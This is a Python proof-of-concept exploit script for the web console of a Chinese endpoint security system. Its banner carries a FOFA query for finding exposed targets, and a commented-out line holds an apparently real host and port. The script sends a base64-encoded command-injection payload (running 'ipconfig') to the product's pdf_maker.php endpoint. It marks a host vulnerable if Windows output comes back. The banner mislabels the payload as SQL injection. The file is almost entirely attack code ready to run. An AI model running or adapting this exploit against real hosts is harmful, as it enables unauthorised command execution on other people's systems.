import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+-------------------------------------------------------------------------+')
    print('+-------------------fofa:title="在线安装-V8+终端安全系统Web控制台"------------+')
    print('+--------------------User Format: poc_SQL.py------------------------------+')
    print('+-------------------------------------------------------------------------+')
def run(ip, port):
    proto = ['http', 'https']
    i = 0
    while i < len(proto):
        target = '{}://{}:{}'.format(proto[i], ip, port)
        proto_result = run_proto(target)
        if proto_result:
            return True
        else:
            i = i + 1
def run_proto(target):
    url = target + "/inter/pdf_maker.php"
    print(url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "url=Inx8aXBjb25maWd8fA==&fileName=xxx"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if "Windows" in req.text and req.status_code == 200:
            print(req.text)
            return True
        else:
            return False
    except Exception as e:
        return False


if __name__ == '__main__':
    title()
    target = sys.argv[1]
    #target = '1.85.3.27:6868'
    ip = target.split(':')[0]
    port = str(int(target.split(':')[1]))
    result = run(ip, port)
    if result:
        print('Exist')
    else:
        print('UnExist')
